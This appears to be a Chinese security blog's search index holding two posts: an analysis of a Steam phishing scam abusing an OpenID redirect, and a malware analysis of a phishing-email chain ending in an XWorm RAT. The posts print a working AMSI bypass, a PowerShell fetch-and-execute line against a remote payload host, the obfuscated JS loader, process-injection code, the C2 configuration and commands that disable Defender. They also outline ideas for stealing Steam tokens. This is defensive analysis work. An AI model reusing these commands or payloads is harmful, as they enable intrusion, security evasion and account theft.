<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>Steam上的黑产哥钓鱼手法</title>
      <link href="/posts/b2a7e9f.html"/>
      <url>/posts/b2a7e9f.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>打个csgo还有黑产哥过来钓鱼，真的蚌埠住。。。之前没有今天从buff买了个”可燃冰AK”、”后发制人的沙鹰”就收到了？疑似有爬虫爬buff挨个加好友钓鱼 x<br><img src="https://i.miji.bid/2023/08/09/71cdce098a3d9ca95b18866eb0769a54.jpeg" alt=""></p><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p>黑产佬:<a href="https://steamcommunity.com/id/Suzanne101986" target="_blank" rel="noopener">https://steamcommunity.com/id/Suzanne101986</a><br><img src="https://i.miji.bid/2023/08/09/765fd0e870f8bb88487bddb9ab5c9c80.png" alt=""></p><p><img src="https://i.miji.bid/2023/08/09/bd295c9da8647bc13875e85e95511d13.png" alt=""></p><p>好友我删了，话术大概是这样的</p><pre><code>XXX:我们是不是认识xxx:上一个月我好像排到过你xxx:你csgo段位是多少xxx:我们在打5e竞技，可以和外国人打xxx:我们缺一个人，邀请你来打xxx:不参加投个票，投票随机获取一个饰品 -&gt; 让你在他那个站登录steamxxx:https://bisaixiaoxin.com/ -&gt;钓鱼站</code></pre><p><img src="https://i.miji.bid/2023/08/09/5dc9fed60a04703871930c66e65a130f.png" alt=""></p><p>一看这域名我tm傻眼了，(图片都显示不出来，用点心吧)<br><img src="https://i.miji.bid/2023/08/09/0e8c01f3afcd18e08e29a81a0a6f757f.png" alt=""></p><p>点击steam登录如下 【新弹个div，然后用js记录输入的账号密码，你登录完后在跳转会当前页面】<br><img src="https://i.miji.bid/2023/08/09/f52f2cc0ce49b4cc3c5752f2f4d84ec6.png" alt=""><br><img src="https://i.miji.bid/2023/08/09/6ea91f0e4f7f3080d47e863f0c39d308.png" alt=""></p><p>抓了一下包js还是混淆的<br><img src="https://i.miji.bid/2023/08/09/c2c6ccd89827b9600970223b0c309bb8.png" alt=""></p><p>用的这个加密:<a href="https://www.json.cn/json/jshx.html" target="_blank" rel="noopener">https://www.json.cn/json/jshx.html</a></p><p>google一搜啥都没看见，域名whois一看google cf，注册时间去年7月<br><img src="https://i.miji.bid/2023/08/09/cdacb32ec974bf04653dd04cb564cabb.png" alt=""></p><p>钓鱼url:</p><pre><code>https://steamcommunity.com/openid/login?openid.ns=http://specs.openid.net/auth/2.0&amp;openid.mode=checkid_setup&amp;openid.return_to=https://https://bisaixiaoxin.com/?login&amp;openid.realm=https://https://bisaixiaoxin.com&amp;openid.ns.sreg=http://openid.net/extensions/sreg/1.1&amp;openid.claimed_id=http://specs.openid.net/auth/2.0/identifier_select&amp;openid.identity=http://specs.openid.net/auth/2.0/identifier_select</code></pre><p>拆开参数测试，发现是个URL跳转漏洞<code>https://steamcommunity.com/openid/login?openid.ns=http://specs.openid.net/auth/2.0&amp;openid.mode=checkid_setup&amp;openid.return_to=http://nn44f6.dnslog.cn</code></p><p>在steam上显示是这样的<br><img src="https://i.miji.bid/2023/08/09/41115cc83bfd01271f959bf5ccdddcc5.png" alt=""></p><p>登录后，点击授权后会请求过来<br><img src="https://i.miji.bid/2023/08/09/e41b0f6fb4226f4b9f97a9b418b573b0.png" alt=""></p><p><img src="https://i.miji.bid/2023/08/09/49c5e967101f88da2399c1c07ce70ce8.png" alt=""></p><p>看了一下url跳转<br><img src="https://i.miji.bid/2023/08/09/f85a00df62f1ba469624cdeefd252fb5.png" alt=""></p><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>以假乱真，登录完账号密码，在跳回当前页面 （在你登录成功后2fa后，短时间内不在需要二步验证）<br>偷龙换凤，搞个真的授权跳转到自己这，然后把token偷了<br>暗度陈仓，你成功登录后他url跳转把你饰品卖 （url跳转+csrf打组合拳）</p><h2 id="时间线"><a href="#时间线" class="headerlink" title="时间线"></a>时间线</h2><p>从微步社区来看最早21年03月就有师傅曝光了<br><a href="https://x.threatbook.com/v5/article?threatInfoID=3293" target="_blank" rel="noopener">https://x.threatbook.com/v5/article?threatInfoID=3293</a> </p><p>从b站21年开头就有人写了<br><a href="https://www.bilibili.com/video/BV16K411M7Eq/" target="_blank" rel="noopener">https://www.bilibili.com/video/BV16K411M7Eq/</a></p><p>所以今年都23年了快24年了都不修吗</p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>不要轻易相信任何人:D</p>]]></content>
      
      
        <tags>
            
            <tag> 恶意分析 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>某钓鱼邮件分析</title>
      <link href="/posts/6e8ca819.html"/>
      <url>/posts/6e8ca819.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>划水摆烂分析点东西</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.securonix.com/blog/securonix-threat-labs-security-meme4chan-advisory/" target="_blank" rel="noopener">https://www.securonix.com/blog/securonix-threat-labs-security-meme4chan-advisory/</a></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>在线沙箱:<br><a href="https://app.any.run/tasks/33363f16-8146-4bef-948b-362ec2cb0f6d/" target="_blank" rel="noopener">https://app.any.run/tasks/33363f16-8146-4bef-948b-362ec2cb0f6d/</a><br><a href="https://www.joesandbox.com/analysis/1284837/1/html" target="_blank" rel="noopener">https://www.joesandbox.com/analysis/1284837/1/html</a></p><p>CVE-2022-30190利用<br>（远程链接）<br><a href="https://huskidkifklaoksikfkfijsju.blogspot.com/atom.xml" target="_blank" rel="noopener">https://huskidkifklaoksikfkfijsju.blogspot.com/atom.xml</a> #已404<br><a href="https://73cceb63-7ecd-45e2-9eab-f8d98aab177f.usrfiles.com/ugd/73cceb_b5b6005e2aa74cf48cd55dca1a2ff093.docx" target="_blank" rel="noopener">https://73cceb63-7ecd-45e2-9eab-f8d98aab177f.usrfiles.com/ugd/73cceb_b5b6005e2aa74cf48cd55dca1a2ff093.docx</a><br><img src="https://s1.ax1x.com/2023/08/07/pPEBdnH.png" alt=""></p><p><img src="https://s1.ax1x.com/2023/08/07/pPEBDAI.png" alt=""></p><p>从分析文找到远程加载的payload<br><img src="https://s1.ax1x.com/2023/08/07/pPEB69f.png" alt=""></p><pre><code>http://73cceb63-7ecd-45e2-9eab-f8d98aab177f.usrfiles.com/ugd/73cceb_e5a698286daf43ac87b4544a35b1a482.txt</code></pre><p>可以看到有几个混淆的变量</p><pre><code>$X1$colabber$Hetmosphyre$X2</code></pre><p><strong>阶段一</strong></p><pre><code>-&gt; 运行winword -&gt;延迟3秒 -&gt; 删除C:\Users\*\Downloads\下的所有.docx文件 -&gt; 删除C:\Users\*\Desktop\下的所有.docx文件 -&gt; 创建C:\ProgramData\MinMinons -&gt;将$Gamilopera写入C:\ProgramData\MinMinons\Candlegraphy.~___~-&gt;IEX运行$Gamilopera变量</code></pre><p><img src="https://s1.ax1x.com/2023/08/07/pPEBhHs.png" alt=""></p><pre><code>$X1-&gt;js内容三层hex解密        -&gt;js内容写入到C:\ProgramData\MinMinons\Microsoftupdate.js        -&gt;创建计划任务运行js schtasks /create /sc MINUTE /mo 180 /tn MOperaChrome /F /tr C:\ProgramData\MinMinons\Microsoftupdate.js        js阶段:            -&gt;ActiveXObject组件通过CLSID:{F935DC22-1CF0-11D0-ADB9-00C04FD58A0B}实例化wscript.Shell            -&gt;延迟3秒            -&gt;要运行的命令替换运行powershell-&gt; powershell -EP Bypass -c Get-Content -RAW C:\ProgramData\MinMinons\Candlegraphy.~___~ | .(&#39;{x}{9}&#39;.replace(&#39;9&#39;,&#39;0&#39;).replace(&#39;x&#39;,&#39;1&#39;)-f&#39;GIMGUL&#39;,&#39;%%&#39;).replace(&#39;%%&#39;,&#39;I&#39;).replace(&#39;GIMGUL&#39;,&#39;EX&#39;) | ping 127.0.0.1</code></pre><p><img src="https://s1.ax1x.com/2023/08/07/pPEDS4x.png" alt=""></p><p>C:\ProgramData\MinMinons\Microsoftupdate.js</p><pre><code>var  _0x3195=[&quot;\x6E\x65\x77\x3A\x7B\x46\x39\x33\x35\x44\x43\x32\x32\x2D\x31\x43\x46\x30\x2D\x31\x31\x44\x30\x2D\x41\x44\x42\x39\x2D\x30\x30\x43\x30\x34\x46\x44\x35\x38\x41\x30\x42\x7D&quot;,&quot;\x53\x6C\x65\x65\x70&quot;,&quot;\x70\x6F\x77\x65\x72\x73\x68\x2A\x5E\x20\x2D\x45\x50\x20\x42\x79\x70\x61\x73\x73\x20\x2D\x63\x20\x47\x65\x74\x2D\x43\x6F\x6E\x74\x65\x6E\x74\x20\x2D\x52\x41\x57\x20\x43\x3A\x5C\x50\x72\x6F\x67\x72\x61\x6D\x44\x61\x74\x61\x5C\x4D\x69\x6E\x4D\x69\x6E\x6F\x6E\x73\x5C\x43\x61\x6E\x64\x6C\x2A\x67\x72\x61\x70\x68\x79\x2E\x7E\x5F\x5F\x5F\x7E\x20\x7C\x20\x2E\x28\x27\x7B\x78\x7D\x7B\x39\x7D\x27\x2E\x72\x65\x70\x6C\x61\x63\x65\x28\x27\x39\x27\x2C\x27\x30\x27\x29\x2E\x72\x65\x70\x6C\x61\x63\x65\x28\x27\x78\x27\x2C\x27\x31\x27\x29\x2D\x66\x27\x47\x49\x4D\x47\x55\x4C\x27\x2C\x27\x25\x25\x27\x29\x2E\x72\x65\x70\x6C\x61\x63\x65\x28\x27\x25\x25\x27\x2C\x27\x49\x27\x29\x2E\x72\x65\x70\x6C\x61\x63\x65\x28\x27\x47\x49\x4D\x47\x55\x4C\x27\x2C\x27\x45\x58\x27\x29\x20\x7C\x20\x70\x69\x6E\x67\x20\x31\x32\x37\x2E\x30\x2E\x30\x2E\x31&quot;,&quot;\x2A&quot;,&quot;\x65&quot;,&quot;\x72\x65\x70\x6C\x61\x63\x65&quot;,&quot;\x5E&quot;,&quot;\x6C\x6C&quot;,&quot;\x52\x75\x6E&quot;];/*new:{F935DC22-1CF0-11D0-ADB9-00C04FD58A0B}Sleeppowersh*^ -EP Bypass -c Get-Content -RAW C:\ProgramData\MinMinons\Candl*graphy.~___~ |  .(&#39;{x}{9}&#39;.replace(&#39;9&#39;,&#39;0&#39;).replace(&#39;x&#39;,&#39;1&#39;)-f&#39;GIMGUL&#39;,&#39;%%&#39;).replace(&#39;%%&#39;,&#39;I&#39;).replace(&#39;GIMGUL&#39;,&#39;EX&#39;) | ping 127.0.0.1*ereplace^llRun*/combackmyex= ActiveXObject(_0x3195[0]); //new:{F935DC22-1CF0-11D0-ADB9-00C04FD58A0B}WScript[_0x3195[1]](3000); //延??时???3秒? Sleep(3000)Jigijigi= _0x3195[2]; //powersh*^ -EP Bypass -c Get-Content -RAW  C:\ProgramData\MinMinons\Candl*graphy.~___~ |  .(&#39;{x}{9}&#39;.replace(&#39;9&#39;,&#39;0&#39;).replace(&#39;x&#39;,&#39;1&#39;)-f&#39;GIMGUL&#39;,&#39;%%&#39;).replace(&#39;%%&#39;,&#39;I&#39;).replace(&#39;GIMGUL&#39;,&#39;EX&#39;) | ping 127.0.0.1Jigijigi= Jigijigi[_0x3195[5]](_0x3195[3],_0x3195[4]); //replace * eJigijigi= Jigijigi[_0x3195[5]](_0x3195[3],_0x3195[4]); //replace * eJigijigi= Jigijigi[_0x3195[5]](_0x3195[3],_0x3195[4]); //replace * eJigijigi= Jigijigi[_0x3195[5]](_0x3195[3],_0x3195[4]); //replace * eJigijigi= Jigijigi[_0x3195[5]](_0x3195[6],_0x3195[7]); //replace ^ ll -&gt; powershell -EP  Bypass -c Get-Content -RAW C:\ProgramData\MinMinons\Candlegraphy.~___~ |  .(&#39;{x}{9}&#39;.replace(&#39;9&#39;,&#39;0&#39;).replace(&#39;x&#39;,&#39;1&#39;)-f&#39;GIMGUL&#39;,&#39;%%&#39;).replace(&#39;%%&#39;,&#39;I&#39;).replace(&#39;GIMGUL&#39;,&#39;EX&#39;) | ping 127.0.0.1combackmyex[_0x3195[8]](Jigijigi,0,true) //Run 运?行Dpowershell</code></pre><p>C:\ProgramData\MinMinons\Candlegraphy.~___~<br><img src="https://s1.ax1x.com/2023/08/07/pPEDIqH.png" alt=""></p><p><strong>阶段2</strong><br>$colabber<br>$Hetmosphyre<br>实现的功能</p><pre><code>-&gt; [Ref].Assembly.GetType(&#39;System.Management.Automation.AmsiUtils&#39;).GetField(&#39;amsiInitFailed&#39;,&#39;NonPublic,Static&#39;).SetValue($null,$true) AMSI绕过        -&gt; 注册表设置COM口劫持amsi绕过 &#39;HKCU:\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\InProcServer32&#39; -N &#39;(Default)&#39; -V &quot;C:\IDontExist.dll&quot;        -&gt;解密两个.NET的PE，分别赋值变量$Ripple - 2.4.dll 和$$Ripple - chas.exe        -&gt;$Ripple .NET内存加载 2.4.dll nanamespace:A class:B Method:C            -&gt;A.B.C(&quot;C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe&quot;,[OBJECT[]]$Ripple)            -&gt;A.B.C(&quot;C:\Windows\Microsoft.NET\Framework\v2.0.50727\RegSvcs.exe&quot;,[OBJECT[]]$Ripple)            -&gt;A.B.C(&quot;C:\Windows\Microsoft.NET\Framework\v3.5\Msbuild.exe&quot;,[OBJECT[]]$Ripple)            内存加载实现将chas.exe进程注入到RegSvcs.exe和Msbuild.exe</code></pre><p><img src="https://s1.ax1x.com/2023/08/07/pPEDzLQ.png" alt=""></p><pre><code>* 2.4.dll - 傀儡进程* chas.exe - C2</code></pre><p>DLL是用de4ot混淆过的<br><img src="https://s1.ax1x.com/2023/08/07/pPEr9ds.png" alt=""><br><img src="https://s1.ax1x.com/2023/08/07/pPErCon.png" alt=""></p><p>2.4.DLL<br><img src="https://s1.ax1x.com/2023/08/07/pPErFJ0.png" alt=""><br><img src="https://i.miji.bid/2023/08/07/df1df47780927aec30f7c355c3bf66a4.png" alt=""><br><img src="https://i.miji.bid/2023/08/07/836e42a880d48050217ddc307c33f7cc.png" alt=""></p><p>去混淆</p><pre><code>        public static string smethod_0(string string_11)        {            StringBuilder stringBuilder = new StringBuilder();            for (int i = 0; i &lt; string_11.Length; i += 2)            {                int value = Convert.ToInt32(string_11.Substring(i, 2), 16);                stringBuilder.Append(Convert.ToChar(value));            }            return stringBuilder.ToString();        }        public static string ReverseString(string s)        {            char[] array = s.ToCharArray();            Array.Reverse(array);            return new string(array);        }</code></pre><pre><code>    // Token: 0x04000001 RID: 1        private static string string_0 = B.smethod_0(B.ReverseString(&quot;2333C656E62756B6&quot;)); //Kernel32        // Token: 0x04000002 RID: 2        private static string string_1 = B.smethod_0(B.ReverseString(&quot;46165627864556D657375625&quot;)); //ResumeThread        // Token: 0x04000003 RID: 3        private static string string_2 = B.smethod_0(&quot;576F77363&lt;?&gt;53657&lt;?&gt;5&lt;?&gt;687265616&lt;?&gt;&lt;?&gt;36F6E7&lt;?&gt;65787&lt;?&gt;&quot;.Replace(&quot;&lt;?&gt;&quot;, &quot;4&quot;)); //Wow64SetThreadContext        // Token: 0x04000004 RID: 4        private static string string_3 = B.smethod_0(B.ReverseString(&quot;47875647E6F634461656278645475635&quot;)); //SetThreadContext        // Token: 0x04000005 RID: 5        private static string string_4 = B.smethod_0(&quot;57?F773?3447?57454?872?5?1?443?F?E74?57874&quot;.Replace(&quot;?&quot;, &quot;6&quot;)); //Wow64GetThreadContext        // Token: 0x04000006 RID: 6        private static string string_5 = B.smethod_0(B.ReverseString(&quot;47875647E6F634461656278645475674&quot;)); //GetThreadContext        // Token: 0x04000007 RID: 7        private static string string_6 = B.smethod_0(&quot;5??9727475?1?C41?C?C?F?34578&quot;.Replace(&quot;?&quot;, &quot;6&quot;)); //VirtualAllocEx        // Token: 0x04000008 RID: 8        private static string string_7 = B.smethod_0(B.ReverseString(&quot;9727F6D656D437375636F627055647962775&quot;)); //WriteProcessMemory        // Token: 0x04000009 RID: 9        private static string string_8 = B.smethod_0(&quot;5265616450?26F6365?3?34D656D6F?2?9&quot;.Replace(&quot;?&quot;, &quot;7&quot;)); //ReadProcessMemory        // Token: 0x0400000A RID: 10        private static string string_9 = B.smethod_0(B.ReverseString(&quot;E6F6964736563566F4775696650716D6E65577A5&quot;)); //ZwUnmapViewOfSection        // Token: 0x0400000B RID: 11        private static string string_10 = B.smethod_0(&quot;4372?5?174?55072?F?3?5737341&quot;.Replace(&quot;?&quot;, &quot;6&quot;)); //CreateProcessA        // Token: 0x0400000C RID: 12        private static readonly B.Delegate0 delegate0_0 = B.smethod_1&lt;B.Delegate0&gt;(B.string_0, B.string_1);        // Token: 0x0400000D RID: 13        private static readonly B.Delegate1 delegate1_0 = B.smethod_1&lt;B.Delegate1&gt;(B.string_0, B.string_2);        // Token: 0x0400000E RID: 14        private static readonly B.Delegate2 delegate2_0 = B.smethod_1&lt;B.Delegate2&gt;(B.string_0, B.string_3);        // Token: 0x0400000F RID: 15        private static readonly B.Delegate3 delegate3_0 = B.smethod_1&lt;B.Delegate3&gt;(B.string_0, B.string_4);        // Token: 0x04000010 RID: 16        private static readonly B.Delegate4 delegate4_0 = B.smethod_1&lt;B.Delegate4&gt;(B.string_0, B.string_5);        // Token: 0x04000011 RID: 17        private static readonly B.Delegate5 delegate5_0 = B.smethod_1&lt;B.Delegate5&gt;(B.string_0, B.string_6);        // Token: 0x04000012 RID: 18        private static readonly B.Delegate6 delegate6_0 = B.smethod_1&lt;B.Delegate6&gt;(B.string_0, B.string_7);        // Token: 0x04000013 RID: 19        private static readonly B.Delegate7 delegate7_0 = B.smethod_1&lt;B.Delegate7&gt;(B.string_0, B.string_8);        // Token: 0x04000014 RID: 20        private static readonly B.Delegate8 delegate8_0 = B.smethod_1&lt;B.Delegate8&gt;(B.smethod_0(&quot;6E74646C6C&quot;), B.string_9);        // Token: 0x04000015 RID: 21        private static readonly B.Delegate9 delegate9_0 = B.smethod_1&lt;B.Delegate9&gt;(B.string_0, B.string_10);</code></pre><p>chas.exe<br>创建互斥体，线程随机延时。接收socket回包执行对应的功能<br><img src="https://i.miji.bid/2023/08/07/2496b987750dc9814579b195f2eaadc9.png" alt=""><br><img src="https://i.miji.bid/2023/08/07/440cea9821448965fc73385b936496cb.png" alt=""><br><img src="https://i.miji.bid/2023/08/07/8c5934f0b07e2222a44dd6e54b541ec1.png" alt=""></p><p>C2配置</p><pre><code>namespace Stub{    // Token: 0x02000007 RID: 7    public class Settings    {        // Token: 0x04000006 RID: 6        public static string Host = &quot;stanthely2023.duckdns.org&quot;;        // Token: 0x04000007 RID: 7        public static string Port = &quot;7000&quot;;        // Token: 0x04000008 RID: 8        public static string KEY = &quot;&lt;123456789&gt;&quot;;        // Token: 0x04000009 RID: 9        public static string SPL = &quot;&lt;Xwormmm&gt;&quot;;        // Token: 0x0400000A RID: 10        public static string USBNM = &quot;USB.exe&quot;;        // Token: 0x0400000B RID: 11        public static readonly string Mutexx = &quot;tddITwpC5yRaJiTI&quot;;        // Token: 0x0400000C RID: 12        public static Mutex _appMutex;        // Token: 0x0400000D RID: 13        public static bool usbC;        // Token: 0x0400000E RID: 14        public static string current = Process.GetCurrentProcess().MainModule.FileName;    }</code></pre><p>通讯使用AES加密<br><img src="https://i.miji.bid/2023/08/07/0ebfc30b0ca07191655dbd1667f80e36.png" alt=""></p><p>C2功能：<br>|function|note|<br>|——–|—-|<br>|Ping|心跳包功能|<br>|Info|获取被控主机详细信息|<br>|admin|判断是否为管理员|<br>|Antivirus|枚举杀毒|<br>|STDos|DDOS|<br>|Plugin|动态加载.NET|<br>|Download|下载者|<br>|getDrives|枚举盘符/USB|<br>|getFiles|获取文件信息|<br>|getFolders|遍历文件夹|</p><p><img src="https://i.miji.bid/2023/08/07/88977dc504340d8fe6a4e1ef632510f4.png" alt=""></p><p>$DEP</p><pre><code>-&gt;  注册表设置COM口劫持amsi绕过 &#39;HKCU:\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\InProcServer32&#39; -N &#39;(Default)&#39; -V &quot;C:\IDontExist.dll&quot;        -&gt; Defender后缀加白:&quot;.bat&quot;,&quot;.ppam&quot;,&quot;.xls&quot;,&quot;.docx&quot;,&quot;.bat&quot;,&quot;.exe&quot;,&quot;.vbs&quot;,&quot;.js&quot;,路径加白:&quot;C:\&quot;,&quot;D:\&quot;,&quot;E:\&quot;,进程加白:&quot;explorer.exe&quot;,&quot;kernel32.dll&quot;,&quot;kernel32.dll&quot;,&quot;aspnet_compiler.exe&quot;,&quot;cvtres.exe&quot;,&quot;CasPol.exe&quot;,&quot;csc.exe&quot;,&quot;csc.exe&quot;,&quot;Msbuild.exe&quot;,&quot;ilasm.exe&quot;,&quot;InstallUtil.exe&quot;,&quot;jsc.exe&quot;,&quot;Calc.exe&quot;,&quot;powershell.exe&quot;,&quot;rundll32.exe&quot;,&quot;conhost.exe&quot;,&quot;Cscript.exe&quot;,&quot;mshta.exe&quot;,&quot;cmd.exe&quot;,&quot;DefenderisasuckingAntivirus&quot;,&quot;wscript.exe&quot; IP加白:&quot;127.0.0.1&quot;        -&gt; Defender IDS关闭        -&gt; Defender关闭        -&gt; UAC限制开启 New-Ipublicroperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system -Name EnableLUA -PropertyType DWord -Value 0 -Force        -&gt; 停止WinDefend服务，取消WinDefend服务自启        -&gt; 创建用户System32 pwd:123添加到管理员,将创建的System32用户添加到&quot;Remote Desktop Users&quot;组        -&gt; 停止WinDefend服务，停止WdNisSvc服务，停止WdNisSvc服务，删除windefend服务        -&gt; 防火墙关闭</code></pre><p><img src="https://i.miji.bid/2023/08/07/8dac8d365b310d93269d96defc35bc89.png" alt=""><br><img src="https://i.miji.bid/2023/08/07/592b5898dfb4f6907f6bb866e7655ae0.png" alt=""><br><img src="https://i.miji.bid/2023/08/07/441f58300fbe730c550b6b13596a2bc6.png" alt=""></p><p><strong>阶段3</strong><br>$X2</p><pre><code>    -&gt; 三层hex解密js内容写入C:\ProgramData\MinMinons\miguan.js        -&gt; 计划任务运行miguan.js schtasks /create /sc MINUTE /mo 164 /tn miguaned /F /tr &quot;$helogamanunu C:\\ProgramData\\MinMinons\\miguan.js&quot;            -&gt; 5秒后计划执行powershell Schtasks.exe /create /sc minute /mo 120 /tn escansupdate /f /tr “wscript.exe //b //e:jscript c:\\programdata\\REDACTED\\windowsdefenderupdate.js”    powershell.exe    “c:\windows\system32\windowspowershell\v1.0\powershell.exe” -ep bypass -c (i’w’r(‘hxxps://powpowpowff.blogspot[.]com/atom.xml’) -useb) | .(‘{1}{0}’-f’ex’,’i’) | ping 127.0.0.1        -&gt; 将&quot;C:\\ProgramData\\MinMinons\&quot; 下所有文件复制到开机自启路径(Startup)        -&gt;删除C:\ProgramData\MinMinons\Candlegraphy.~___~        -&gt;删除C:\ProgramData\MinMinons\*.vbs        -&gt;删除C:\ProgramData\MinMinons\*.exe</code></pre><p><img src="https://i.miji.bid/2023/08/07/2d2fd253577209b45a6af9606d552608.png" alt=""></p><pre><code> eval(function(p,a,c,k,e,d){e=function(c){return(c&lt;a?&#39;&#39;:e(parseInt(c/a)))+((c=c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))};if(!&#39;&#39;.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return  d[e]}];e=function(){return&#39;\\w+&#39;};c=1};while(c--){if(k[c]){p=p.replace(new  RegExp(&#39;\\b&#39;+e(c)+&#39;\\b&#39;,&#39;g&#39;),k[c])}}return p}(&#39;4=q(&quot;o:{n-m-l-g-j}&quot;);i[&quot;8&quot;](d);2=&quot;b&gt;h*^ -a  p&gt;&gt; -c (5\&#39;w\&#39;r(\&#39;k\&#39;) -u&gt;*B) |  .(\&#39;{x}{9}\&#39;.3(\&#39;9\&#39;,\&#39;0\&#39;).3(\&#39;x\&#39;,\&#39;1\&#39;)-f\&#39;6\&#39;,\&#39;%%\&#39;).3(\&#39;%%\&#39;,\&#39;5\&#39;).3(\&#39;6\&#39;,\&#39;t\&#39;) |  v  A.0.0.1&quot;;2=2.3(&quot;*&quot;,&quot;e&quot;);2=2.3(&quot;*&quot;,&quot;e&quot;);2=2.3(&quot;*&quot;,&quot;e&quot;);2=2.3(&quot;^&quot;,&quot;z&quot;);2=2.3(&quot;&gt;&quot;,&quot;s&quot;);2=2.3(&quot;&gt;&quot;,&quot;s&quot;);2=2.3(&quot;&gt;&quot;,&quot;s&quot;);2=2.3(&quot;&gt;&quot;,&quot;s&quot;);4[&quot;y&quot;](2,0,7);&#39;,38,38,&#39;||Jigijigi|replace|combackmyex|I|geleography|true|Sleep||eP|power||5000|||ADB9||WScript|00C04FD58A0B|https://billielishhui.blogspot.com/atom.xml|11D0|1CF0|F935DC22|new|Bypa|ActiveXObject|||EX||ping|||RUN|ll|127|&#39;.split(&#39;|&#39;),0,{}))</code></pre><p>全部流程：</p><pre><code>1.ps1-&gt; 运行winword-&gt;延迟3秒-&gt; 删除C:\Users\*\Downloads\下的所有.docx文件-&gt; 删除C:\Users\*\Desktop\下的所有.docx文件-&gt; 创建C:\ProgramData\MinMinons-&gt;将$Gamilopera写入C:\ProgramData\MinMinons\Candlegraphy.~___~-&gt;IEX运行$Gamilopera变量    第一阶段:        -&gt;js内容三层hex解密        -&gt;js内容写入到C:\ProgramData\MinMinons\Microsoftupdate.js        -&gt;创建计划任务运行js schtasks /create /sc MINUTE /mo 180 /tn MOperaChrome /F /tr C:\ProgramData\MinMinons\Microsoftupdate.js        js阶段:            -&gt;ActiveXObject组件通过CLSID:{F935DC22-1CF0-11D0-ADB9-00C04FD58A0B}实例化wscript.Shell            -&gt;延迟3秒            -&gt;要运行的命令替换运行powershell-&gt; powershell -EP Bypass -c Get-Content -RAW C:\ProgramData\MinMinons\Candlegraphy.~___~ | .(&#39;{x}{9}&#39;.replace(&#39;9&#39;,&#39;0&#39;).replace(&#39;x&#39;,&#39;1&#39;)-f&#39;GIMGUL&#39;,&#39;%%&#39;).replace(&#39;%%&#39;,&#39;I&#39;).replace(&#39;GIMGUL&#39;,&#39;EX&#39;) | ping 127.0.0.1    第二阶段:        -&gt; [Ref].Assembly.GetType(&#39;System.Management.Automation.AmsiUtils&#39;).GetField(&#39;amsiInitFailed&#39;,&#39;NonPublic,Static&#39;).SetValue($null,$true) AMSI绕过        -&gt; 注册表设置COM口劫持amsi绕过 &#39;HKCU:\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\InProcServer32&#39; -N &#39;(Default)&#39; -V &quot;C:\IDontExist.dll&quot;        -&gt;解密两个.NET的PE，分别赋值变量$Ripple - 2.4.dll 和$$Ripple - chas.exe        -&gt;$Ripple .NET内存加载 2.4.dll nanamespace:A class:B Method:C            -&gt;A.B.C(&quot;C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe&quot;,[OBJECT[]]$Ripple)            -&gt;A.B.C(&quot;C:\Windows\Microsoft.NET\Framework\v2.0.50727\RegSvcs.exe&quot;,[OBJECT[]]$Ripple)            -&gt;A.B.C(&quot;C:\Windows\Microsoft.NET\Framework\v3.5\Msbuild.exe&quot;,[OBJECT[]]$Ripple)            内存加载实现将chas.exe进程注入到RegSvcs.exe和Msbuild.exe        -&gt;  注册表设置COM口劫持amsi绕过 &#39;HKCU:\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\InProcServer32&#39; -N &#39;(Default)&#39; -V &quot;C:\IDontExist.dll&quot;        -&gt; Defender后缀加白:&quot;.bat&quot;,&quot;.ppam&quot;,&quot;.xls&quot;,&quot;.docx&quot;,&quot;.bat&quot;,&quot;.exe&quot;,&quot;.vbs&quot;,&quot;.js&quot;,路径加白:&quot;C:\&quot;,&quot;D:\&quot;,&quot;E:\&quot;,进程加白:&quot;explorer.exe&quot;,&quot;kernel32.dll&quot;,&quot;kernel32.dll&quot;,&quot;aspnet_compiler.exe&quot;,&quot;cvtres.exe&quot;,&quot;CasPol.exe&quot;,&quot;csc.exe&quot;,&quot;csc.exe&quot;,&quot;Msbuild.exe&quot;,&quot;ilasm.exe&quot;,&quot;InstallUtil.exe&quot;,&quot;jsc.exe&quot;,&quot;Calc.exe&quot;,&quot;powershell.exe&quot;,&quot;rundll32.exe&quot;,&quot;conhost.exe&quot;,&quot;Cscript.exe&quot;,&quot;mshta.exe&quot;,&quot;cmd.exe&quot;,&quot;DefenderisasuckingAntivirus&quot;,&quot;wscript.exe&quot; IP加白:&quot;127.0.0.1&quot;        -&gt; Defender IDS关闭        -&gt; Defender关闭        -&gt; UAC限制开启 New-Ipublicroperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system -Name EnableLUA -PropertyType DWord -Value 0 -Force        -&gt; 停止WinDefend服务，取消WinDefend服务自启        -&gt; 创建用户System32 pwd:123添加到管理员,将创建的System32用户添加到&quot;Remote Desktop Users&quot;组        -&gt; 停止WinDefend服务，停止WdNisSvc服务，停止WdNisSvc服务，删除windefend服务        -&gt; 防火墙关闭    第三阶段:        -&gt; 三层hex解密js内容写入C:\ProgramData\MinMinons\miguan.js        -&gt; 计划任务运行miguan.js schtasks /create /sc MINUTE /mo 164 /tn miguaned /F /tr &quot;$helogamanunu C:\\ProgramData\\MinMinons\\miguan.js&quot;            -&gt; 5秒后计划执行powershell Schtasks.exe /create /sc minute /mo 120 /tn escansupdate /f /tr “wscript.exe //b //e:jscript c:\\programdata\\REDACTED\\windowsdefenderupdate.js”    powershell.exe    